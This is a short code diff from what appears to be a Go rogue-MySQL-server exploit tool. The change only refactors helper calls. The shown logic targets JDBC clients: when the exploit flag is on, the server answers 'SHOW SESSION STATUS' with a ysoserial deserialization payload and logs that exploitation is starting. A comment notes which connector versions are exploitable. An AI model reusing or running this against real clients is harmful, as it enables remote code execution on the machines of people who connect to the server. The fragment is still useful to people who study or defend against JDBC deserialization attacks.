@@ -191,16 +191,16 @@ func (db *DB) ComQuery(c *mysql.Conn, query string, callback func(*sqltypes.Resu
     if db.config.JdbcExploit && (db.config.AlwaysExploit || c.IsJdbcClient) {
         if query == "SHOW SESSION STATUS" {
             log.Infof("Client request `SESSION STATUS`, start exploiting...")
-            r := &sqltypes.Result{Fields: schemaToFields(Schema{
+            r := &sqltypes.Result{Fields: mysql.SchemaToFields(mysql.Schema{
                 {Name: "Variable_name", Type: sqltypes.Blob, Nullable: false},
                 {Name: "Value", Type: sqltypes.Blob, Nullable: false},
             })}
-            r.Rows = append(r.Rows, rowToSQL(Row{[]byte{}, db.YsoserialOutput}))
+            r.Rows = append(r.Rows, mysql.RowToSQL(mysql.SQLRow{[]byte{}, db.YsoserialOutput}))
 
             _ = callback(r)
         } else if strings.HasPrefix(query, "/* mysql-connector-java-8") {
             // 对于 mysql-connector-java-5 和 6，不用发送这些变量也能利用
-            r := getMysqlVars()
+            r := mysql.GetMysqlVars()
 
             _ = callback(r)
         } else {
